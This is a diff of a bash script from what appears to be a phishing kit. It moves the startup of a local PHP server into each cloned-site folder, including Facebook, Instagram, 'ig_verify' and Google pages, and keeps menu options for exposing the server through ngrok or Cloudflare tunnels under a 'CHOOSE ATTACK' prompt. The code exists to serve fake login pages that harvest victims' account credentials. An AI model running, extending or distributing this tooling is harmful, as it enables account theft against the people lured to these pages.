@@ -11,7 +11,7 @@ echo -e "\e[96m        |=====================================================|"
 
 }
 local(){
-bash local.sh 
+php -S localhost:8080  
 echo -e "\e[96m        |=====================================================|"
 echo -e "\e[96m        |      [\e[92m1\e[96m]==> NGROK                       |"
 echo -e "\e[96m        |      [\e[92m2\e[96m]==> CLOUDFLARE                  |"
@@ -140,10 +140,10 @@ read -p "CHOOSE ATTACK : " FB
 case $OP in
 1)
 cd .sites/
-local
+
 
 cd facebook
- 
+local 
 while true;
 
 do
@@ -167,8 +167,9 @@ done
 ;;
 2)
 cd .sites/
-local
+
 cd fb_advanced
+local
 while true;
 
 do
@@ -192,9 +193,10 @@ done
 ;;
 3)
 cd .sites/
-local
+
 
 cd fb_security
+local
 while true;
 
 do
@@ -218,9 +220,10 @@ done
 ;;
 4)
 cd .sites
-local 
+ 
 
 cd fb_messenger
+local
 
 while true;
 
@@ -272,10 +275,10 @@ case $IG in
 1)
 
 cd .sites/
-local
+
 
 cd instagram
-
+local
 while true;
 
 do
@@ -299,10 +302,10 @@ done
 ;;
 2)
 cd .sites/
-local
+
 
 cd ig_followers
-
+local
 while true;
 
 do
@@ -326,9 +329,10 @@ done
 ;;
 3)
 cd .sites
-local
+
 
 cd insta_followers
+local
 
 while true;
 
@@ -353,10 +357,10 @@ done
 ;;
 4)
 cd .sites/
-local
+
 
 cd ig_verify
-
+local
 while true;
 
 do
@@ -407,9 +411,10 @@ case $GG in
 1)
 
 cd .sites/
-local
 
-cd google
+
+cd google 
+local
 ip
 while true;
 
@@ -433,9 +438,10 @@ done
 ;;
 2)
 cd .sites/
-local
+
 
 cd google_poll
+local
 
 while true;
 
@@ -460,9 +466,10 @@ done
 ;;
 3)
 cd .sites
-local
+
 
 cd google_new
+local
 
 while true;
 
